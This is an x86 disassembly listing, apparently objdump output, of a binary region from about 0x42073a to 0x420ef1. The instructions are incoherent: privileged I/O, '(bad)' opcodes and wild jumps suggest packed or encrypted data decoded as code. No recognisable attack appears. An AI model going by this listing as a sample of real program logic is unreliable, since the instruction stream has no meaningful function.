  42073a:	test   edx,eax
  42073c:	lock xor BYTE PTR [ebp+0x11],al
  420740:	pop    ecx
  420741:	jbe    0x420724
  420743:	cmp    eax,0xbd21fa81
  420748:	test   BYTE PTR [ecx],0x38
  42074b:	stc    
  42074c:	iret   
  42074d:	cmp    edi,DWORD PTR [edi+0xd]
  420750:	xchg   ebx,edx
  420752:	loopne 0x420756
  420754:	mov    ebp,0xc7fbfe10
  420759:	push   DWORD PTR [edi]
  42075b:	cmc    
  42075c:	aas    
  42075d:	pop    ebp
  42075e:	xchg   edx,eax
  42075f:	(bad)  
  420760:	pop    esp
  420761:	ss cmp al,0xb4
  420764:	adc    eax,ebp
  420766:	out    dx,eax
  420767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420768:	cmp    DWORD PTR [ebx-0x2b8eabe9],eax
  42076e:	xchg   DWORD PTR [esi-0x89d404e],eax
  420774:	imul   esi,DWORD PTR [ecx+esi*8-0x49],0x19
  420779:	pop    ds
  42077a:	jb     0x420787
  42077c:	mov    ds:0x13485db,al
  420781:	mov    dh,0xd0
  420783:	into   
  420784:	xchg   BYTE PTR [edi],al
  420786:	jae    0x420777
  420788:	aaa    
  420789:	mov    al,0xea
  42078b:	mov    ?,WORD PTR [eax-0x26]
  42078e:	ja     0x420744
  420790:	and    BYTE PTR [ebx+0x206809b2],0x3c
  420797:	push   ecx
  420798:	pusha  
  420799:	dec    ebx
  42079a:	mov    dh,0x1b
  42079c:	data16 stc 
  42079e:	loope  0x420755
  4207a0:	add    esp,DWORD PTR [ebx]
  4207a2:	outs   dx,DWORD PTR ds:[esi]
  4207a3:	pop    ebx
  4207a4:	cmp    BYTE PTR [edx],0xd0
  4207a7:	and    al,0x92
  4207a9:	fisttp QWORD PTR [esi+eiz*4]
  4207ac:	in     al,0xbf
  4207ae:	mov    ch,0x7c
  4207b0:	out    dx,eax
  4207b1:	rcr    bh,0x64
  4207b4:	xchg   BYTE PTR [eax-0x3b7792e2],bl
  4207ba:	shl    BYTE PTR [edx],cl
  4207bc:	stos   DWORD PTR es:[edi],eax
  4207bd:	sub    BYTE PTR [ebx+0x5b],0xeb
  4207c1:	js     0x4207e5
  4207c3:	sahf   
  4207c4:	dec    ecx
  4207c5:	out    0x8a,eax
  4207c7:	mov    eax,ds:0xffa93b6d
  4207cc:	test   al,0xfa
  4207ce:	adc    ebx,DWORD PTR [eax]
  4207d0:	lock mov edi,0x672c8837
  4207d6:	jno    0x4207a7
  4207d8:	iret   
  4207d9:	push   edi
  4207da:	mov    edx,0x9b58de21
  4207df:	clc    
  4207e0:	fs adc eax,0xd3651b6f
  4207e6:	cmp    eax,0xc7e19f46
  4207eb:	es out dx,al
  4207ed:	lds    edi,FWORD PTR [ecx]
  4207ef:	int3   
  4207f0:	iret   
  4207f1:	aad    0x83
  4207f3:	sub    al,0x4c
  4207f5:	and    al,0xe6
  4207f7:	pop    eax
  4207f8:	fldenv [eax-0x15161428]
  4207fe:	daa    
  4207ff:	push   edi
  420800:	int3   
  420801:	ds repnz xchg ecx,eax
  420804:	cdq    
  420805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420806:	fnstsw WORD PTR ds:0x256ca6d2
  42080c:	inc    eax
	...
  420819:	add    BYTE PTR [edi+0x4c],dh
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx-0x3d5bd003]
  420828:	aas    
  420829:	outs   dx,BYTE PTR ds:[esi]
  42082a:	add    eax,DWORD PTR [ebp+0x1fb0001]
  420830:	add    BYTE PTR [eax],al
  420832:	(bad)  
  420833:	and    al,0xbf
  420835:	mov    esp,0xa1ddd7bd
  42083a:	sbb    al,0x88
  42083c:	es mov dl,0xdc
  42083f:	imul   ebx,DWORD PTR [esi],0x20
  420842:	dec    eax
  420843:	pop    ebp
  420844:	neg    BYTE PTR [ebp-0x77e04406]
  42084a:	push   edx
  42084b:	dec    edi
  42084c:	mov    edx,DWORD PTR [eax]
  42084e:	retf   0x85dd
  420851:	push   esp
  420852:	push   cs
  420853:	call   0xb94e4b6a
  420858:	pop    esp
  420859:	test   DWORD PTR [edx+eiz*1],edi
  42085c:	push   esi
  42085d:	ja     0x420879
  42085f:	aam    0x44
  420861:	add    BYTE PTR [esi-0x14],al
  420864:	scas   al,BYTE PTR es:[edi]
  420865:	mov    gs,WORD PTR [ebp+0x6af5b97d]
  42086b:	mov    esp,0xc694e7bf
  420870:	std    
  420871:	loop   0x420861
  420873:	cli    
  420874:	mov    esi,DWORD PTR [ebx+0x2e]
  420877:	cmp    eax,0x97fa3b3f
  42087c:	mov    ah,0xd9
  42087e:	jp     0x42089e
  420880:	test   eax,0xf7d54a17
  420885:	xor    DWORD PTR [edx],0x3c16a210
  42088b:	scas   eax,DWORD PTR es:[edi]
  42088c:	mov    ds:0xb5435787,eax
  420891:	jmp    0x420872
  420893:	cld    
  420894:	push   esi
  420895:	mov    WORD PTR [edx-0x4afc92e4],gs
  42089b:	(bad)  
  42089c:	shl    DWORD PTR gs:[edx-0x62],cl
  4208a0:	hlt    
  4208a1:	hlt    
  4208a2:	shl    DWORD PTR [ecx+0x79a11bfd],0x85
  4208a9:	enter  0xedc3,0x33
  4208ad:	mov    cl,0x1a
  4208af:	js     0x420839
  4208b1:	adc    DWORD PTR [ebx+0x7d],0x29f8917f
  4208b8:	jl     0x42086f
  4208ba:	xor    DWORD PTR [edx-0x3a01e3b],ecx
  4208c0:	mov    es,WORD PTR [ebp+0x43]
  4208c3:	out    dx,al
  4208c4:	cwde   
  4208c5:	sub    BYTE PTR [eax-0x28551697],0x27
  4208cc:	cmp    bh,BYTE PTR [edx-0x7a4d4bac]
  4208d2:	jne    0x4208fe
  4208d4:	adc    ah,BYTE PTR [eax+0x37]
  4208d7:	xchg   edx,eax
  4208d8:	mov    ah,0x46
  4208da:	cmp    DWORD PTR [esp+ebx*1-0x50],ebp
  4208de:	dec    edi
  4208df:	(bad)  
  4208e0:	jne    0x420891
  4208e2:	dec    ebp
  4208e3:	stc    
  4208e4:	pop    ds
  4208e5:	ror    BYTE PTR [esi+0x15],1
  4208e8:	or     al,0xd4
  4208ea:	iret   
  4208eb:	jge    0x4208d7
  4208ed:	dec    esp
  4208ee:	leave  
  4208ef:	jmp    0xa1724001
  4208f4:	add    DWORD PTR [eax-0x60370fae],0xe8ff5870
  4208fe:	jns    0x4208f6
  420900:	test   eax,0xdbb39265
  420905:	sub    DWORD PTR [ebx+0xb],ecx
  420908:	sbb    al,0x72
  42090a:	cmp    ch,BYTE PTR [edx-0x7ba2e5f1]
  420910:	add    esi,DWORD PTR [esp+eax*8]
  420913:	or     edi,DWORD PTR [edx-0x1b]
  420916:	shl    ecx,0xae
  420919:	mov    al,ds:0x9ce56298
  42091e:	xchg   esp,eax
  42091f:	dec    eax
  420920:	mov    al,ds:0x8254e0e3
  420925:	in     al,0x52
  420927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420928:	cli    
  420929:	add    eax,0xf867f96
  42092e:	shl    esp,1
  420930:	fisttp QWORD PTR [esi]
  420932:	loop   0x420946
  420934:	mov    dl,0x66
  420936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420937:	gs ss cwde 
  42093a:	dec    DWORD PTR [eax+0x8]
  42093d:	pop    esp
  42093e:	pop    esp
  42093f:	sub    ecx,eax
  420941:	jp     0x42098e
  420943:	push   cs
  420944:	xchg   esp,eax
  420945:	mov    dl,0x4d
  420947:	ss or  eax,0x1c5cc321
  42094d:	pop    es
  42094e:	cli    
  42094f:	imul   edx,DWORD PTR ds:0x3c76,0xc55b9f6e
  420958:	fs retf 0xfa98
  42095c:	adc    al,0xea
  42095e:	xchg   ecx,eax
  42095f:	push   0x75288393
  420964:	cmp    eax,DWORD PTR [ebx]
  420966:	inc    edx
  420967:	dec    esp
  420968:	stos   BYTE PTR es:[edi],al
  420969:	pop    edi
  42096a:	fadd   QWORD PTR [esp+edx*4]
  42096d:	mov    al,ds:0x7353db45
  420972:	cld    
  420973:	imul   eax,DWORD PTR [ebp-0x7b],0x65fa28ae
  42097a:	cmc    
  42097b:	das    
  42097c:	fsubr  DWORD PTR [ebx]
  42097e:	sbb    al,BYTE PTR [eax-0x49]
  420981:	jb     0x4209c3
  420983:	outs   dx,DWORD PTR ds:[esi]
  420984:	test   BYTE PTR [esi],bl
  420986:	adc    eax,0x59df316d
  42098b:	pushf  
  42098c:	cmp    ch,BYTE PTR [eax+0x4e]
  42098f:	pop    ebp
  420990:	xchg   ecx,eax
  420991:	add    ebp,ebx
  420993:	popf   
  420994:	rcr    BYTE PTR [edi+0x30],1
  420997:	mov    edx,0x2e99312f
  42099c:	cdq    
  42099d:	std    
  42099e:	out    dx,eax
  42099f:	int3   
  4209a0:	jp     0x4209da
  4209a2:	sahf   
  4209a3:	mov    bh,0xe
  4209a5:	out    0x91,eax
  4209a7:	push   ebx
  4209a8:	jb     0x420996
  4209aa:	lods   eax,DWORD PTR ds:[esi]
  4209ab:	sub    ch,ch
  4209ad:	and    BYTE PTR [edx+edi*8+0x7023f94f],dh
  4209b4:	data16 adc cl,BYTE PTR [ebp+0x7738bd3d]
  4209bb:	or     cl,ah
  4209bd:	aaa    
  4209be:	or     al,0x19
  4209c0:	nop
  4209c1:	jle    0x4209c0
  4209c3:	jnp    0x420985
  4209c5:	stos   BYTE PTR es:[edi],al
  4209c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209c7:	imul   esi,DWORD PTR [ecx-0xc8d2e15],0xffffffe3
  4209ce:	sbb    dl,cl
  4209d0:	ror    DWORD PTR [eax],1
  4209d2:	push   cs
  4209d3:	mov    al,ds:0xfa3b87ef
  4209d8:	fst    DWORD PTR [edx+0x57]
  4209db:	dec    edx
  4209dc:	cmp    BYTE PTR [edi+edx*4-0x740a22c4],ch
  4209e3:	inc    ebp
  4209e4:	adc    ebx,ebp
  4209e6:	mov    bh,0xce
  4209e8:	mov    dl,0x1f
  4209ea:	nop
  4209eb:	adc    BYTE PTR fs:[edi-0x3],0xca
  4209f0:	inc    ebx
  4209f1:	addr16 sbb ecx,esp
  4209f4:	cmp    DWORD PTR [ebx-0x17],edi
  4209f7:	outs   dx,DWORD PTR ds:[esi]
  4209f8:	and    eax,0x53664410
  4209fd:	test   DWORD PTR [eax],0xc102879f
  420a03:	jae    0x4209b3
  420a05:	cmp    dl,0x87
  420a08:	and    BYTE PTR [ecx+0x6d],bh
  420a0b:	push   edx
  420a0c:	stos   DWORD PTR es:[edi],eax
  420a0d:	cli    
  420a0e:	bound  edx,QWORD PTR [edx-0x38]
  420a11:	dec    esi
  420a12:	loop   0x420a7d
  420a14:	loope  0x420a6f
  420a16:	mov    esi,0x40b62257
  420a1b:	cs push esi
  420a1d:	mov    ebp,0xdf90423d
  420a22:	jns    0x420a06
  420a24:	sbb    DWORD PTR [ebp-0x83d0a87],esi
  420a2a:	mov    BYTE PTR [edi],cl
  420a2c:	push   es
	...
  420a39:	add    BYTE PTR [edi],al
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420ac4
  420a47:	(bad)  
  420a49:	int    0xfe
  420a4b:	xchg   BYTE PTR [ecx],al
  420a4d:	add    bl,bh
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    al,bh
  420a53:	xchg   ebp,eax
  420a54:	jmp    0xf298d93a
  420a59:	lahf   
  420a5a:	scas   al,BYTE PTR es:[edi]
  420a5b:	lahf   
  420a5c:	test   bl,al
  420a5e:	xchg   ebp,eax
  420a5f:	adc    al,0x8a
  420a61:	inc    ecx
  420a62:	dec    esp
  420a63:	add    edi,DWORD PTR [esi+0x4]
  420a66:	stos   BYTE PTR es:[edi],al
  420a67:	in     al,dx
  420a68:	and    BYTE PTR [ecx+0x9],bl
  420a6b:	mov    edi,0xc5d37a5b
  420a70:	popa   
  420a71:	imul   ebx,DWORD PTR [esi],0x86c55cb9
  420a77:	ja     0x420ae8
  420a79:	xchg   ebx,eax
  420a7a:	jb     0x420a35
  420a7c:	out    dx,eax
  420a7d:	mov    BYTE PTR [ebp+0x8],dl
  420a80:	mov    bl,0xe3
  420a82:	sub    al,0xe3
  420a84:	pop    esi
  420a85:	mov    fs,esi
  420a87:	add    bl,0xeb
  420a8a:	imul   edx,DWORD PTR es:[ecx-0x65bce0bf],0x4b
  420a92:	xor    eax,ebp
  420a94:	cld    
  420a95:	out    0x44,eax
  420a97:	ret    0xc30e
  420a9a:	mov    eax,0x486e8406
  420a9f:	mov    al,0x71
  420aa1:	or     al,BYTE PTR [ecx+0x4e]
  420aa4:	cmp    DWORD PTR [esi],ebp
  420aa6:	lahf   
  420aa7:	push   0xffffffe9
  420aa9:	idiv   esp
  420aab:	push   ebx
  420aac:	mov    al,ds:0x595484f
  420ab1:	sbb    al,0x99
  420ab3:	push   edx
  420ab4:	mov    al,0x4e
  420ab6:	mov    eax,ds:0x213900e7
  420abb:	dec    ebx
  420abc:	pop    ecx
  420abd:	pop    esp
  420abe:	scas   eax,DWORD PTR es:[edi]
  420abf:	adc    eax,0xffa304b9
  420ac4:	repnz xchg ecx,eax
  420ac6:	push   ebp
  420ac7:	pop    eax
  420ac8:	pop    eax
  420ac9:	int3   
  420aca:	pop    ds
  420acb:	imul   edi,DWORD PTR [edx-0x686e0f63],0x4f8a1695
  420ad5:	pop    esi
  420ad6:	jmp    0xecd9184
  420adb:	in     al,0xf8
  420add:	test   eax,0xfe762d04
  420ae2:	dec    ecx
  420ae3:	dec    esp
  420ae4:	inc    esi
  420ae5:	xor    eax,0xa90c381d
  420aea:	mov    edx,DWORD PTR [ebx+0x2e882d9d]
  420af0:	xor    ecx,DWORD PTR [edi]
  420af2:	sub    bh,ch
  420af4:	(bad)  
  420af5:	clc    
  420af6:	sbb    edi,DWORD PTR [ebp-0x71]
  420af9:	and    eax,0xffd4e305
  420afe:	jle    0x420b56
  420b00:	lea    ecx,[edi+eax*2]
  420b03:	pop    ebx
  420b04:	adc    ah,BYTE PTR [esi+eiz*2]
  420b07:	sbb    BYTE PTR [eax+0xe],0x13
  420b0b:	mov    al,0x71
  420b0d:	push   ss
  420b0e:	pushf  
  420b0f:	xor    eax,0x955cb8ba
  420b14:	ja     0x420a9d
  420b16:	inc    edx
  420b17:	jns    0x420aad
  420b19:	mov    fs,WORD PTR [esi]
  420b1b:	mov    bh,0x4c
  420b1d:	cmp    al,0x79
  420b1f:	out    dx,eax
  420b20:	dec    eax
  420b21:	xchg   ebx,eax
  420b22:	data16 adc al,bl
  420b25:	cmp    dl,BYTE PTR [ebp+0x2fec2253]
  420b2b:	sub    eax,0x696a0258
  420b30:	in     eax,dx
  420b31:	add    dl,bl
  420b33:	push   esi
  420b34:	pop    ebp
  420b35:	out    0x6d,al
  420b37:	outs   dx,DWORD PTR ds:[esi]
  420b38:	adc    esp,DWORD PTR [ecx+eax*4+0x45d2142d]
  420b3f:	mov    esp,0x8a076fb4
  420b44:	popa   
  420b45:	daa    
  420b46:	sub    DWORD PTR [esp+ecx*8-0x13ac8fa7],esp
  420b4d:	outs   dx,DWORD PTR ds:[esi]
  420b4e:	inc    ebx
  420b4f:	(bad)  
  420b50:	das    
  420b51:	lahf   
  420b52:	cmp    bl,dl
  420b54:	and    dh,0xaf
  420b57:	data16 sbb BYTE PTR [edi],ah
  420b5a:	jnp    0x420b82
  420b5c:	cdq    
  420b5d:	push   esi
  420b5e:	xor    edx,DWORD PTR [ecx-0x1420a065]
  420b64:	pusha  
  420b65:	cmp    BYTE PTR [ecx-0x68ec6790],bh
  420b6b:	cmp    DWORD PTR [ebp-0x47],ebx
  420b6e:	xchg   esp,eax
  420b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b70:	pushf  
  420b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b72:	rol    DWORD PTR [eax-0x126defc6],1
  420b78:	pusha  
  420b79:	mov    ebx,0xbea876f8
  420b7e:	dec    eax
  420b7f:	sbb    eax,0xade10988
  420b84:	jne    0x420b32
  420b86:	lds    esi,FWORD PTR [eax+0x5a720cd0]
  420b8c:	jmp    0x5e5c:0xa63353f
  420b93:	popa   
  420b94:	adc    dh,BYTE PTR ds:[ecx-0x39]
  420b98:	stos   BYTE PTR es:[edi],al
  420b99:	jp     0x420b5f
  420b9b:	mov    eax,ds:0x2480fb2
  420ba0:	jae    0x420b53
  420ba2:	scas   al,BYTE PTR es:[edi]
  420ba3:	dec    ecx
  420ba4:	mov    esi,0x8437e520
  420ba9:	push   esp
  420baa:	dec    edi
  420bab:	mov    ch,0xa
  420bad:	xchg   ecx,eax
  420bae:	out    0x29,eax
  420bb0:	(bad)  
  420bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bb2:	adc    esp,DWORD PTR [ebp-0xffc0b6d]
  420bb8:	lds    ecx,FWORD PTR [ecx+0x3a]
  420bbb:	add    al,0x19
  420bbd:	dec    edx
  420bbe:	gs mov cl,al
  420bc1:	sub    eax,0x3e64f196
  420bc6:	ja     0x420bc4
  420bc8:	mov    ebx,0xb2addf10
  420bcd:	or     DWORD PTR [ecx],ecx
  420bcf:	sbb    BYTE PTR [edi+esi*8-0x7a],dh
  420bd3:	cwde   
  420bd4:	iret   
  420bd5:	das    
  420bd6:	jp     0x420bdc
  420bd8:	add    al,0x6c
  420bda:	mov    ds:0x5dcce547,al
  420bdf:	sub    cl,BYTE PTR [edi]
  420be1:	jmp    0x420bdf
  420be3:	aam    0xd7
  420be5:	fmul   DWORD PTR [edx]
  420be7:	pop    ds
  420be8:	test   DWORD PTR [esi-0x2bc706be],edi
  420bee:	xor    DWORD PTR [eax+ecx*1+0x46],ecx
  420bf2:	es jne 0x420bb8
  420bf5:	das    
  420bf6:	clc    
  420bf7:	or     eax,0x9083de1e
  420bfc:	test   al,0x62
  420bfe:	out    dx,al
  420bff:	call   DWORD PTR [ebp+0x64]
  420c02:	xor    eax,0xf52225a9
  420c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c08:	mov    al,ds:0x8c72aa34
  420c0d:	mov    cl,0xec
  420c0f:	push   0xffffffed
  420c11:	fimul  DWORD PTR es:[edi]
  420c14:	mov    ds:0x25e615f5,eax
  420c19:	das    
  420c1a:	imul   eax,DWORD PTR [esp+edx*4-0xa],0x43
  420c1f:	jge    0x420c20
  420c21:	push   di
  420c23:	call   0x1fd1495a
  420c28:	sbb    BYTE PTR [esi],bl
  420c2a:	sbb    DWORD PTR [esi],eax
  420c2c:	es inc edx
  420c2e:	sub    edi,DWORD PTR [eax+0x29f91ae5]
  420c34:	xchg   esp,eax
  420c35:	mov    ah,al
  420c37:	neg    BYTE PTR [edx+eiz*1-0x43]
  420c3b:	and    ecx,DWORD PTR [esi-0x28e93b7e]
  420c41:	in     al,0x26
  420c43:	or     esi,eax
  420c45:	pusha  
  420c46:	les    edi,FWORD PTR cs:[edx]
  420c49:	outs   dx,BYTE PTR ds:[esi]
  420c4a:	and    al,0xa4
  420c4c:	stos   BYTE PTR es:[edi],al
	...
  420c59:	add    BYTE PTR [esi],bl
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    edx,fs
  420c67:	out    0x9e,eax
  420c69:	push   ss
  420c6a:	stc    
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    bl,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR [eax-0x11],ah
  420c74:	add    bh,BYTE PTR [edx+0x7a]
  420c77:	inc    ebx
  420c78:	push   ds
  420c79:	dec    edi
  420c7a:	pop    eax
  420c7b:	clc    
  420c7c:	pop    esp
  420c7d:	cmp    DWORD PTR [ebx-0x3a1ebc53],esi
  420c83:	push   ebx
  420c84:	ins    BYTE PTR es:[edi],dx
  420c85:	inc    ebx
  420c86:	or     edi,DWORD PTR [esi]
  420c88:	imul   edx,DWORD PTR [edi],0x38be2789
  420c8e:	jecxz  0x420c4c
  420c90:	call   0x51610578
  420c95:	jmp    0xf0ea:0xf9fa6e7f
  420c9c:	xchg   edx,eax
  420c9d:	adc    BYTE PTR [edi+ebp*2],ch
  420ca0:	lods   al,BYTE PTR ds:[esi]
  420ca1:	fmul   st,st(4)
  420ca3:	push   0x21
  420ca5:	and    dl,bh
  420ca7:	sbb    al,0x21
  420ca9:	push   ds
  420caa:	xchg   ecx,eax
  420cab:	adc    al,0xa8
  420cad:	dec    ecx
  420cae:	inc    ebx
  420caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cb0:	xor    eax,0x83f3611e
  420cb5:	or     ebx,eax
  420cb7:	push   ds
  420cb8:	les    ecx,FWORD PTR [edi+0x4e94c1e3]
  420cbe:	and    eax,0xebbd4bed
  420cc3:	add    DWORD PTR [edi-0x293ca273],edi
  420cc9:	cli    
  420cca:	pop    eax
  420ccb:	test   eax,0x4a2078b0
  420cd0:	std    
  420cd1:	sub    BYTE PTR [ecx+0x1267d3f8],ch
  420cd7:	sbb    ch,BYTE PTR [ebp+0x297d23dd]
  420cdd:	repnz push edx
  420cdf:	xchg   ebp,eax
  420ce0:	fmul   QWORD PTR [eax+edx*2]
  420ce3:	mov    ds:0x28b598e3,eax
  420ce8:	or     DWORD PTR [edi],esp
  420cea:	fnsave [ebx]
  420cec:	retf   
  420ced:	ret    
  420cee:	mov    ecx,0x67f5118
  420cf3:	inc    ecx
  420cf4:	pusha  
  420cf5:	(bad)  
  420cf6:	or     ch,BYTE PTR [ebx-0x1]
  420cf9:	xlat   BYTE PTR ds:[ebx]
  420cfa:	int3   
  420cfb:	dec    esi
  420cfc:	cmp    ebx,0x8531c268
  420d02:	mov    ch,0x9b
  420d04:	ss out dx,al
  420d06:	jl     0x420d6c
  420d08:	in     eax,0x64
  420d0a:	in     al,0x2d
  420d0c:	sub    DWORD PTR [edi+0x29],esp
  420d0f:	lahf   
  420d10:	and    dl,bl
  420d12:	pop    ds
  420d13:	pop    ds
  420d14:	shr    DWORD PTR [esi+edi*4],1
  420d17:	int3   
  420d18:	in     al,0x77
  420d1a:	mov    bh,ah
  420d1c:	push   esi
  420d1d:	cmp    eax,0x2f7bbb0e
  420d22:	fdivr  QWORD PTR [eax-0x2f]
  420d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d26:	xchg   edi,eax
  420d27:	jno    0x420cec
  420d29:	pop    ds
  420d2a:	jecxz  0x420d49
  420d2c:	jge    0x420d9e
  420d2e:	jmp    0x420d3f
  420d30:	enter  0x1930,0xb1
  420d34:	and    DWORD PTR [ecx+0x75efe063],esi
  420d3a:	dec    ebx
  420d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d3c:	and    BYTE PTR [edx-0x28],cl
  420d3f:	cs push esp
  420d41:	frstpm(287 only) 
  420d43:	xchg   esp,eax
  420d44:	iret   
  420d45:	div    ecx
  420d47:	or     BYTE PTR [esp+ebp*4-0x62],0xe4
  420d4c:	mov    ds:0xe885f270,al
  420d51:	pop    esi
  420d52:	mov    dh,0x71
  420d54:	fidiv  WORD PTR [ebx-0x44]
  420d57:	pushf  
  420d58:	xlat   BYTE PTR ds:[ebx]
  420d59:	aaa    
  420d5a:	(bad)  
  420d5b:	or     al,0x15
  420d5d:	xor    DWORD PTR [edi+0x59498861],ebp
  420d63:	dec    ebp
  420d64:	leave  
  420d65:	scas   al,BYTE PTR es:[edi]
  420d66:	fidiv  DWORD PTR [ebx]
  420d68:	iret   
  420d69:	int3   
  420d6a:	add    al,0xeb
  420d6c:	xor    BYTE PTR [edx-0x25],ah
  420d6f:	xchg   ebp,eax
  420d70:	retf   0x1694
  420d73:	popa   
  420d74:	fistp  WORD PTR [esi]
  420d76:	or     eax,0xa1f01571
  420d7b:	mov    ebp,DWORD PTR [ebx-0x2c]
  420d7e:	out    0xbc,eax
  420d80:	sbb    BYTE PTR [ebp-0xf],bh
  420d83:	aas    
  420d84:	mov    ss,WORD PTR [edi-0x70e4bd1a]
  420d8a:	push   es
  420d8b:	ss mov dh,0xe
  420d8e:	and    eax,0x43486173
  420d93:	xchg   esp,eax
  420d94:	test   BYTE PTR [eax],0xb2
  420d97:	add    esi,ebp
  420d99:	pop    edi
  420d9a:	ffree  st(3)
  420d9c:	sti    
  420d9d:	push   ebx
  420d9e:	pop    ebp
  420d9f:	enter  0xdacc,0xfe
  420da3:	hlt    
  420da4:	in     al,dx
  420da5:	xchg   ebp,eax
  420da6:	sahf   
  420da7:	hlt    
  420da8:	pop    ecx
  420da9:	xlat   BYTE PTR ds:[ebx]
  420daa:	dec    ebx
  420dab:	mov    bl,0xe3
  420dad:	adc    al,0x88
  420daf:	mov    cl,0x6f
  420db1:	cdq    
  420db2:	(bad)  
  420db3:	push   edx
  420db4:	jmp    0x9c0264f4
  420db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dba:	mov    dh,0x87
  420dbc:	and    ebx,DWORD PTR [ebp-0x5cd9718c]
  420dc2:	popf   
  420dc3:	lds    eax,FWORD PTR ds:0x5038ed8d
  420dc9:	neg    ebp
  420dcb:	loope  0x420dd8
  420dcd:	sar    ebx,1
  420dcf:	les    ecx,FWORD PTR [edx]
  420dd1:	push   esp
  420dd2:	das    
  420dd3:	test   al,0xa4
  420dd5:	and    esi,DWORD PTR [esi-0x23]
  420dd8:	push   cs
  420dd9:	xchg   ecx,edx
  420ddb:	mov    bh,0x13
  420ddd:	add    DWORD PTR [edi],eax
  420ddf:	mov    esi,0x12a76ee6
  420de4:	mov    dl,0x3c
  420de6:	push   ss
  420de7:	push   0xffffffc1
  420de9:	jp     0x420d7c
  420deb:	hlt    
  420dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ded:	adc    al,0xaa
  420def:	mov    edi,0x5d0dc77d
  420df4:	mov    esp,0x77fb454a
  420df9:	enter  0x9f84,0x19
  420dfd:	(bad)  
  420dfe:	push   ds
  420dff:	pop    ds
  420e00:	adc    BYTE PTR [edx+0x1d],dl
  420e03:	xlat   BYTE PTR ds:[ebx]
  420e04:	out    dx,al
  420e05:	mov    bh,0xa4
  420e07:	jg     0x420ddb
  420e09:	push   0xdafe17c7
  420e0e:	dec    esp
  420e0f:	daa    
  420e10:	cs dec ecx
  420e12:	aas    
  420e13:	psubusb mm7,mm0
  420e16:	repz sub eax,0x9df100fa
  420e1c:	(bad)  
  420e1d:	xor    BYTE PTR [edi],ah
  420e1f:	jns    0x420e82
  420e21:	fbld   TBYTE PTR [ebx-0x1374a307]
  420e27:	mov    dh,0x31
  420e29:	sub    eax,0x7f6d0f6a
  420e2e:	aaa    
  420e2f:	xchg   ebx,eax
  420e30:	mov    bl,0x64
  420e32:	and    eax,0x6d1fea88
  420e37:	lock or eax,0x3b11f2bb
  420e3d:	fdivr  DWORD PTR ds:0xf4c1c3d
  420e43:	mov    ds:0xeafb2a4e,al
  420e48:	sbb    eax,DWORD PTR [ebx]
  420e4a:	or     dl,dl
  420e4c:	cmovae ebx,DWORD PTR [ecx-0x1f]
  420e50:	push   edx
  420e51:	jecxz  0x420e01
  420e53:	les    esp,FWORD PTR cs:[ebp-0x8]
  420e57:	jg     0x420deb
  420e59:	aas    
  420e5a:	inc    esp
  420e5b:	xchg   ebp,eax
  420e5c:	and    eax,0xf76195b8
  420e61:	jbe    0x420e12
  420e63:	xor    al,0x8c
  420e65:	cmp    eax,0x792ddc93
  420e6a:	pop    edx
  420e6b:	pop    es
  420e6c:	mov    eax,0x0
	...
  420e79:	add    BYTE PTR [eax-0x77],bh
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e6d
  420e87:	sar    DWORD PTR [edi+0x53],cl
  420e8a:	hlt    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    bl,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    dh,al
  420e93:	pop    eax
  420e94:	cmp    eax,0x8a27a661
  420e99:	cmp    ebp,DWORD PTR [ebx]
  420e9b:	out    0xe9,eax
  420e9d:	nop
  420e9e:	fcmovb st,st(5)
  420ea0:	repz aad 0xca
  420ea3:	fs repnz dec ecx
  420ea6:	mov    ds:0x7c509823,eax
  420eab:	mov    cl,0x5c
  420ead:	add    ecx,eax
  420eaf:	out    0x70,eax
  420eb1:	stos   DWORD PTR es:[edi],eax
  420eb2:	out    0x9,al
  420eb4:	xchg   ebx,eax
  420eb5:	scas   al,BYTE PTR es:[edi]
  420eb6:	je     0x420f22
  420eb8:	dec    esi
  420eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eba:	and    ecx,edx
  420ebc:	or     dh,ch
  420ebe:	jge    0x420e64
  420ec0:	cmp    ebx,DWORD PTR [ecx+0x336f6e36]
  420ec6:	mov    gs,WORD PTR [edx]
  420ec8:	loope  0x420ea3
  420eca:	sub    BYTE PTR [edi-0x68],dh
  420ecd:	popf   
  420ece:	xchg   ecx,eax
  420ecf:	loopne 0x420edb
  420ed1:	dec    eax
  420ed2:	or     ebp,DWORD PTR [eax]
  420ed4:	hlt    
  420ed5:	jl     0x420eb2
  420ed7:	sbb    DWORD PTR [eax-0x4200d123],edi
  420edd:	fwait
  420ede:	out    dx,eax
  420edf:	mov    eax,0x60f15516
  420ee4:	and    eax,0x1dcb67b7
  420ee9:	(bad)  
  420eeb:	pop    esi
  420eec:	jae    0x420f41
  420eee:	sti    
  420eef:	jge    0x420e7e
  420ef1:	popf   
